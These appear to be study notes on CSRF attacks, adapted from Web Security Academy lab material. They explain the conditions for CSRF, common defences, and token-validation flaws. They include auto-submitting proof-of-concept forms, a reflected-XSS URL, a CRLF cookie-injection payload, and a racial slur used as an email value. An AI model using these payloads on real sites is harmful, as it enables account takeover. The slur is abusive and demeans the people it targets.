# **Cross-site request forgery (CSRF)**

## **What is CSRF?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other</span>

## **What is the impact of a CSRF attack?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.</span>

## **How does CSRF work?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Three key conditions must be in place:</span>

- **<span style="font-size: 17px">A relevant action</span>.**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password)</span>
- **<span style="font-size: 17px">Cookie-based session handling</span>.**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests</span>
- **<span style="font-size: 17px">No unpredictable request parameters</span>**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password</span>

**<span style="font-size: 17px">Example:</span>** 

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

<span style="font-size: 17px">This meets the conditions required for CSRF:</span>

- <span style="font-size: 17px">The action of changing the email address on a user's account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.</span>
- <span style="font-size: 17px">The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.</span>
- <span style="font-size: 17px">The attacker can easily determine the values of the request parameters that are needed to perform the action.</span>

**<span style="font-size: 17px">Attack for the Following would be :</span>** 

```vbscript-html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## **How to deliver a CSRF exploit**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The attacker will place the malicious HTML onto a web site that they control, and then induce victims to visit that web site. This might be done by feeding the user a link to the web site, via an email or social media message. Or if the attack is placed into a popular web site (for example, in a user comment), they might just wait for users to visit the web site.</span>

## **Common defences against CSRF**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Successfully finding and exploiting CSRF vulnerabilities often involves bypassing anti-CSRF measures deployed by the target website, the victim's browser, or both. The most common defenses you'll encounter are as follows:</span>

- **<span style="font-size: 17px">CSRF tokens</span>**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim</span>
- **<span style="font-size: 18px">SameSite cookies</span>**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> </span><span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">- SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site.</span>
- **<span style="font-size: 18px">Referer-based validation</span>**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> </span><span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">- Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain.</span>

# **What is the difference between XSS and CSRF?**

[Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user</span>

[Cross-site request forgery](https://portswigger.net/web-security/csrf)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to</span>

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">CSRF often only applies to a subset of actions that a user is able to perform. Many applications implement CSRF defenses in general but overlook one or two actions that are left exposed</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">CSRF can be described as a "one-way" vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request.</span>

## **Can CSRF tokens prevent XSS attacks?**

<span style="font-size: 17px">Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple </span>[<span style="font-size: 17px">reflected XSS</span>](https://portswigger.net/web-security/cross-site-scripting/reflected)<span style="font-size: 17px"> vulnerability that can be trivially exploited like this:</span>

```http
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
```

<span style="font-size: 17px">Now, suppose that the vulnerable function includes a CSRF token:</span>

```http
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>
```

<span style="font-size: 17px">Assuming that the server properly validates the CSRF token, and rejects requests without a valid token, then the token does prevent exploitation of the XSS vulnerability.</span>

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If a reflected XSS vulnerability exists anywhere else on the site within a function that is not protected by a CSRF token, then that XSS can be exploited in the normal way</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If an exploitable XSS vulnerability exists anywhere on a site, then the vulnerability can be leveraged to make a victim user perform actions even if those actions are themselves protected by CSRF tokens. In this situation, the attacker's script can request the relevant page to obtain a valid CSRF token, and then use the token to perform the protected action</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">CSRF tokens do not protect against </span>[stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> vulnerabilities. If a page that is protected by a CSRF token is also the output point for a stored XSS vulnerability, then that XSS vulnerability can be exploited in the usual way, and the XSS payload will execute when a user visits the page</span>

# **Bypassing CSRF token validation**

## **What is a CSRF token?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form</span>

```http
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Submitting this form results in the following request:</span>

```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

## **Common flaws in CSRF token validation**

### **<span style="font-size: 17px">Validation of CSRF token depends on request method</span>**

<span style="font-size: 17px">Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.</span>

<span style="font-size: 17px">In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF Attack :</span>

```vbscript-html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

```http
GET /email/change?email=anything%40web-security-academy.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

### **<span style="font-size: 17px">Validation of CSRF token depends on token being present</span>**

<span style="font-size: 17px">Some applications correctly validate the token when it is present but skip the validation if the token is omitted.</span>

<span style="font-size: 17px">In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack</span>

### **<span style="font-size: 19px">CSRF token is not tied to the user session</span>**

<span style="font-size: 17px">Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.</span>

<span style="font-size: 17px">In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack</span>

```vbscript-html
    <form  method="POST" action="https://0af6006a035a9477809e038d003800bf.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="nigga@gmail.com">
        <input required type="hidden" name="csrf" value="Mn6PR4s2ga6ulrHkxixARCoqStFWZo8w">
    </form>
    <script>
            document.forms[0].submit();
    </script>
```

### **<span style="font-size: 19px">CSRF token is tied to a non-session cookie</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together</span>

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack</span>

### **<span style="font-size: 19px">CSRF token is simply duplicated in a cookie</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.</span>

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

```javascript
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

# **Bypassing SameSite cookie restrictions**

<span style="font-size: 17px">SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some </span>[<span style="font-size: 17px">CORS</span>](https://portswigger.net/web-security/cors)<span style="font-size: 17px"> exploits.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Chrome applies </span>`Lax`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level. This is a proposed standard, and we expect other major browsers to adopt this behavior in the future.</span>

## **What is a site in the context of SameSite cookies?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">a site is defined as the top-level domain (TLD), usually something like </span>`.com`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> or </span>`.net`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, plus one additional level of the domain name. This is often referred to as the TLD+1.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">When determining whether a request is same-site or not, the URL scheme is also taken into consideration. This means that a link from </span>`http://app.example.com`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> to </span>`https://app.example.com`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> is treated as cross-site by most browsers.</span>

![](data:image/png;base64,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